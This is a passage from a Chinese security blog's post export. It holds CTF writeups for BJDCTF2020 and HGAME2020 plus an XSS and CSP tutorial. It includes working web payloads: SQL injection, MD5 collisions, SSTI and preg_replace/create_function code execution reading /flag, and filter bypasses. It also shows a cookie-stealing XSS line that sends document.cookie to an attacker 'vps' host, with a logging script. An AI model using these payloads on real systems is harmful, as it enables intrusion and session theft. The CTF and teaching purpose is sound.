结果：空字符串&#x27;&#x27;var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 结果：空字符串&#x27;&#x27;这里的&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;执行后相当于 strtolower(&quot;&#123;$&#123;1&#125;&#125;&quot;) 又相当于 strtolower(&quot;&#123;null&#125;&quot;) 又相当于 &#x27;&#x27; 空字符串 参考： https://xz.aliyun.com/t/2557","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"php","slug":"php","permalink":"http://www.moonback.xyz/tags/php/"}]},{"title":"BJDCTF2020复现writeup","slug":"BJDCTF复现writeup","date":"2020-01-29T05:48:12.000Z","updated":"2021-01-25T08:59:11.994Z","comments":true,"path":"2020/01/29/BJDCTF复现writeup/","link":"","permalink":"http://www.moonback.xyz/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/","excerpt":"本篇博客主要记录了BGDCTF2020部分题目的writeup！","text":"本篇博客主要记录了BGDCTF2020部分题目的writeup！ webEasy MD5打开题目，在http响应头里找到hint 很熟悉，第一时间的我没有想到，之前做过，哎！https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login 直接提交ffifdyop就行，原因： md5()函数有两个参数 参数一是要加密的字符串； 参数二是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。 字符串ffifdyopMD5加密后再转换成字符串为&#39;or&#39;6&lt;乱码&gt;，拼接后的语句为：select * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39; ，就相当于select * from admin where password=&#39;&#39;or 1 ,实现sql注入 然后跳转到另一个网页，查看源代码 123a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b)) 两种方式： 123levels91.php?a[]&#x3D;1&amp;b[]&#x3D; &#x2F;&#x2F;数组烧过levels91.php?a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a &#x2F;&#x2F;md5弱比较 然后又跳转到另外一个网页 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 还是两种方式： 12345POST: param1[]&#x3D;&amp;param2[]&#x3D;1 &#x2F;&#x2F;数组绕过 bp抓包POST:param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 Mark lovesdirsearch扫出来git源码泄露，恢复出来，得到: 1234567891011121314151617181920212223242526272829&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; //GET方式传flag只能传一个flag=flag exit($handsome); &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; //GET和POST其中之一必须传flag exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; //GET和POST传flag,必须不能是flag=flag exit($is);&#125;echo &quot;the flag is: &quot;.$flag; php可变变量，仔细分析一下，发现可以构造下面的payload: 12345?handsome=flag&amp;flag=handsome //这样的话，经过第二个foreach循环，$handsome就会等于$flag，$flag等于$handsome会不变，经过第三个循环第一次遍历$_GET[&#x27;flag&#x27;]=&quot;handsome&quot;=$x=&quot;handsome&quot;!=&#x27;flag&#x27;，退出输出$handsome即$flag的值?yds=flag //这样的话，在经过第二个foreach循环时，$yds就会等于$flag,在经过第三个foreach循环时，没传flag直接跳过，然后if满足条件，退出输出$yds即$flag The mystery of ip真想不到是SSTI,查看发现XFF可控，smarty模板注入payload: 1X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125; ZJCTF，不过如此源码： 12345678910111213141516&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 读next.php 12?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.phpPOST: I have a dream 得到： 123456789101112&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123; return preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,$str);&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]);&#125; 读flag，具体参见： 1?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;cat /flag&quot;); EasySearch扫路径发现index.php.swp 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else &#123; *** &#125; ***?&gt; 可以看到我们只需要控制password的MD5值前六位为6d0bc1就可以成功写入一个.shtml文件，内容里有username的值，但发现文件名不可控，后来在响应头里看到了文件路径 username写上一句话发现没能解析，后来了解到如果目标Apache服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用下面语法执行任意命令: 1&lt;!--#exec cmd=&quot;id&quot; --&gt; 怎样开启具体参见：https://www.zhangfangzhou.cn/apache-ssi-configuration.html 可以构造如下payload: 最终，在网站目录发现flag Cookie is so stable登陆之后发现Cookie里多了user，同样是SSTI，这个是twig模板，payload: 1user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125; EzPHP查看源代码，发现GFXEIM3YFZYGQ4A=，base32解码得1nD3x.php，访问 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125;if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; ?&gt; 这道题考的知识点比较多，分开记一下 $_SERVER[‘QUERY_STRING’]匹配绕过$_SERVER[&#39;QUERY_STRING&#39;]返回url中查询的字符串，与此类似的还有： $_SERVER[&#39;REQUEST_URI&#39;]返回访问此页面所需的URI $_SERVER[&#39;SCRIPT_NAME&#39;]返回包含当前脚本的路径 $_SERVER[&#39;PHP_SELF&#39;]当前正在执行脚本的文件名 举个例子：(浏览器自动将file的url编码解码了) 可以看到，$_SERVER[&#39;QUERY_STRING&#39;]和$_SERVER[&#39;REQUEST_URI&#39;]在传输时不会url解码，而$_GET,$_POST会url解码，因此我们可以url编码绕过下面代码： 12345if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125; 字符串匹配绕过123if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;&#125; 由于没有/s修饰符用来在匹配时匹配换行符，我们可以使用%0a换行污染绕过 $_REQUEST字母匹配绕过123456if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; 之前的参数都是GET型的，而POST的优先级比GET的要高，因此我们可以POST同样名称满足条件的值，比如数字, 数组类型的数据不需要POST，preg_match()只能匹配字符串，数组得以绕过 file_get_contents比对绕过12if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;); 刚开始想的是php://input，后来发现要POST数据，因此便不能用了，这里可以用data://，示例： 12data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; sha1比较绕过123456if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125; 直接数组绕过，或者sha1碰撞 extract变量覆盖因为extract()函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即flag[code]和flag[arg]的形式 create_function代码注入1234567if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; 最后一个过滤我们可以用create_function()绕过: 12&lt;?php$myFunc = create_function(&#x27;$a, $b&#x27;, &#x27;return($a+$b);&#125;eval($_POST[1]);//&#x27;); 执行时相当于： 1234function myFunc($a, $b)&#123; return $a+$b;&#125;eval($_POST[1]);//&#125; payload先看下所有变量: 1231nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;POST: debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1 读源码： 1231nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;POST： debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1 这里用的是取反绕过，脚本： 12345678&lt;?php$a = &quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = 1 f l a g . p h p&quot;;$arr1 = explode(&#x27; &#x27;, $a);echo &quot;&lt;br&gt;~(&quot;;foreach ($arr1 as $key =&gt; $value) &#123; echo &quot;%&quot;.bin2hex(~$value);&#125;echo &quot;)&lt;br&gt;&quot;; 有点难顶，出题师傅太强了，脑瓜子嗡嗡的~ 非预期解define+fopen()+fgets()没ban掉fopen()，可以fgets()读取文件，但是这个文件指针需要移动就不能读取完整文件，$被禁无法定义变量，最后测试无果后交给shana师傅，被shana师傅整出来了（ttttql），用常量，Payload： 1define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r))；while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa); 非预期解数组操作加了个参数，传上去伪协议，然后get_defined_vars()数组获取到这个伪协议放到require()里包含，payload： 1234?deb%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;rce=%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70&amp;rce2=r&amp;sha%6e%61[]=a&amp;pa%73sw%64[]=b&amp;fla%67[co%64e]=create_function&amp;fla%67[ar%67]=;&#125;require(get_defined_vars()[_GET][rce]);%0a//解码后：?debu=aqua_is_cute&amp;file=data:,debu_debu_aqua&amp;rce=php://filter/read=convert.base64-encode/resource=rea1fl4g.php&amp;rce2=r&amp;shana[]=a&amp;passwd[]=b&amp;flag[code]=create_function&amp;flag[arg]=;&#125;require(get_defined_vars()[_GET][rce]);// 参考： https://www.gem-love.com/websecurity/770.html http://www.gtfly.top/2020/01/30/BJDCTF2020-EzPHP.html","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"BJDCTF","slug":"BJDCTF","permalink":"http://www.moonback.xyz/tags/BJDCTF/"}]},{"title":"xss漏洞及其利用方式","slug":"xss漏洞及其利用方式","date":"2020-01-27T15:02:08.000Z","updated":"2020-02-06T06:59:42.919Z","comments":true,"path":"2020/01/27/xss漏洞及其利用方式/","link":"","permalink":"http://www.moonback.xyz/2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","excerpt":"本篇博客主要介绍了xss漏洞及其利用方式！","text":"本篇博客主要介绍了xss漏洞及其利用方式！ 什么是xss?XSS是跨站脚本攻击(Cross Site Scripting)，和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 xss分类反射型xss反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss” 举个例子： 123456789&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;?php$xss &#x3D; @$_GET[&#39;xss&#39;];if($xss!&#x3D;&#x3D;null)&#123; echo $xss;&#125; 我们在输入框输入&lt;script&gt;alert(1)&lt;/script&gt;就成功触发了弹框 反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器 存储型xss存储型xss一出现在网站留言板，评论处，个人资料处等需要用户可以对网站写入数据的地方。攻击者写入一段窃取cookie的恶意JavaScript代码到评论处，这段恶意代码会写入数据库，当其他用户浏览这个写入代码的页面时，网站从数据库中读取恶意代码显示到网页中被浏览器执行，导致用户cookie被窃取，攻击者无需受害者密码即可登录账户，所以也被称作“持久性xss”。持久性xss比反射型xss危害要大的多 举个例子： 12345678910111213&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;?php$xss&#x3D;@$_POST[&#39;xss&#39;];mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123&quot;);mysql_select_db(&quot;xss&quot;);if($xss!&#x3D;&#x3D;null)&#123; $sql&#x3D;&quot;insert into temp(id,payload) values(&#39;1&#39;,&#39;$xss&#39;)&quot;; $result&#x3D;mysql_query($sql); echo $result;&#125; ?&gt; 不直接显示在页面中，而是插入到了数据库，存储型 XSS 的执行位置通常不同于输入位置 存储型 XSS 的数据流向是：浏览器-&gt; 后端-&gt; 数据库-&gt; 后端-&gt; 浏览器 DOM型xssDOM xss是基于dom文档对象模型，前端脚本通过dom动态修改页面，由于不与服务端进行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。常见的可以操纵dom的对象：URL，localtion,referrer等 举个例子： 1234567891011&lt;?phperror_reporting(0); &#x2F;&#x2F;禁用错误报告$name &#x3D; $_GET[&quot;name&quot;];?&gt;&lt;input id&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot; value&#x3D;&quot;&lt;?php echo $name;?&gt;&quot; &#x2F;&gt;&lt;div id&#x3D;&quot;print&quot;&gt;&lt;&#x2F;div&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;var text &#x3D; document.getElementById(&quot;text&quot;); var print &#x3D; document.getElementById(&quot;print&quot;);print.innerHTML &#x3D; text.value; &#x2F;&#x2F; 获取 text的值，并且输出在print内。这里是导致xss的主要原因。&lt;&#x2F;script&gt; DOM型XSS的数据流向是：URL--&gt;浏览器 xss漏洞利用盗cookie可以在自己vps上简单搭一个，index.php写入下面内容 123&lt;?phpfile_put_contents(&#x27;log.txt&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;].&quot;\\n&quot;,FILE_APPEND);?&gt; 这样就会将请求的内容写入log.txt里了，可以构造类似下面的payload: 123&lt;script&gt;new Image().src=&quot;http://vps/?cookie=&quot;+document.cookie;&lt;/script&gt; xss绕过payloadhttps://xz.aliyun.com/t/2936 https://blog.csdn.net/qq_29277155/article/details/51320064 https://www.freebuf.com/articles/web/153055.html CSP什么是CSP?CSP的全称Content Security Policy，用来防御XSS攻击的技术。它是一种由开发者定义的安全性政策性申明，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。 举个例子： 1Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; 一个CSP头由多组CSP策略组成，中间由分号分隔，其中每一组策略包含一个策略指令和一个内容源列表 策略指令有如下选项： 指令 说明 default-src 定义资源默认加载策略 connect-src 定义 Ajax、WebSocket 等加载策略 font-src 定义 Font 加载策略 frame-src 定义 Frame 加载策略 img-src 定义图片加载策略 media-src 定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略 object-src 定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略 script-src 定义 JS 加载策略 style-src 定义 CSS 加载策略 sandbox 值为 allow-forms，对资源启用 sandbox report-uri 值为 /report-uri，提交日志 内容源有如下选项： 源 说明 * 通配符，允许任何URL，除了data: blob: filesystem: schemes *.foo.com 允许加载foo.com子域的资源 abc.foo.com 只能加载这个域名下的资源 https://a.com 只能用HTTPS加载域名下的资源 https: 通过HTTPS可以加载任意域名下的资源 ‘none’ 代表空集,即不匹配任何URL,两侧单引号是必须的 ‘self’ 代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的 ‘unsafe-inline’ 允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的 ‘unsafe-eval’ 允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的 data: 允许data: URI作为内容来源 mediastream: 允许mediastream: URI作为内容来源 内容源有三种：源列表、关键字和数据，其中，.foo.com，abc.foo.com，https://a.com ，https:属于源列表。’none’，’self’，’unsafe-inline’，’unsafe-eval’属于关键字。data:，mediastream:属于数据 这里有个CSP是否安全的检测网站：https://csp-evaluator.withgoogle.com bypass CSPhttps://hurricane618.me/2018/06/30/csp-bypass-summary/ https://xz.aliyun.com/t/5084 https://zhuanlan.zhihu.com/p/94246164?utm_source=com.tencent.tim&amp;utm_medium=social&amp;utm_oi=910631635467264000","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"xss","slug":"xss","permalink":"http://www.moonback.xyz/tags/xss/"}]},{"title":"HGAME2020比赛部分writeup","slug":"HGAME比赛部分writeup","date":"2020-01-23T09:29:13.000Z","updated":"2020-12-15T04:14:30.370Z","comments":true,"path":"2020/01/23/HGAME比赛部分writeup/","link":"","permalink":"http://www.moonback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/","excerpt":"本篇博客记录了HGAME上web题目和misc题目的writeup！","text":"本篇博客记录了HGAME上web题目和misc题目的writeup！ Week1webCosmos 的博客打开提示github，还着重标了版本管理工具，git源码泄露也没恢复出神魔有用的东西 dirsearch扫下目录，发现好多和git相关的文件和目录 在/.git/config目录下发现网站的github地址 也可以用githack(有两个)：https://github.com/BugScanTeam/GitHack 而不是这个：https://github.com/lijiejie/GitHack 将仓库信息还原下来，然后在有.git文件夹目录用git remote -v 在Commits里的第二个找到base64编码的flag 接 头 霸 王打开发现提示You need to come from https://vidar.club/，想到设置Referer，发现设置完还要设置X-Forwarded-For,User-Agent,请求方式改为POST,If-Unmodified-Since，最终请求 Code World打开发现跳到new.php并提示403 Forbidden，抓包看下，在请求根目录时发现提示405 Not Allowed 搜了搜405的原因：Apache、IIS、Nginx等绝大多数web服务器，都不允许静态文件响应POST请求 解决：将post请求改为get请求 试着改下请求方式，改为POST发现 提示要两个数相加为10，试了试发现GET和POST都要传参，要注意加号要url编码 🐔尼泰玫很卡这题，打开抓下游戏之后的包，发现传递了一个参数，用|分割，前面猜测是分数，后面是Unix时间戳的MD5加密的值，不过好像没啥用，这里有个网站https://tool.lu/timestamp/ 直接改前面的数就行 misc欢迎参加HGame！是一串字符Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t，base64解密发现是摩斯密码，再解密得W3LC0MEnullTOnull2020nullHGAM3，将null替换成_并加上hgame{}得flag 壁纸题目是一张图片，binwalk分离出压缩包，strings查看可显示字符，发现Password is picture ID.，这个图片是P站上的图片，搜一下图片名字，找了找发现也不对，爆破一下吧，发现id是8位数字 成功爆破出来，解压发现是Unicode编码，解码得flag 克苏鲁神话解压题目给的压缩包，发现Bacon.txt和Novel.zip两个文件，并且Novel.zip有和Bacon.txt一样的文件 猜测是明文攻击，提示用7-zip，所以我们用7-zip将Bacon.txt压缩作为明文 直接停止就行，虽然没找到密码，但已成功解压出来了 解压两个文件，Bacon.txt和The Call of Cthulhu.doc打开doc文件发现要密码，txt文件内容如下： 123of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.*Password in capital letters. 大小写字母交叉，显然是培根密码(五个一位，小写字母表示大写字母得加密结果，反之也成立)，替换成小写得aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba 解密得FLAGHIDDENINDOC，输入密码打开，显示隐藏文字，得到flag 签到题ProPlus打开发现两个文件，一个加密的压缩包OK.zip，一个password.txt 文本文件里记录： 123456Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fenses first, Five Caesar next. English sentense first, zip password next. 大概意思是先经过了三层栅栏密码，后经过5层凯撒密码，英语句子在前，压缩包密码在后 栅栏密码在线解密：https://www.qqxiuzi.cn/bianma/zhalanmima.php 凯撒密码在线解密：https://www.qqxiuzi.cn/bianma/kaisamima.php 解密结果： 123Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover 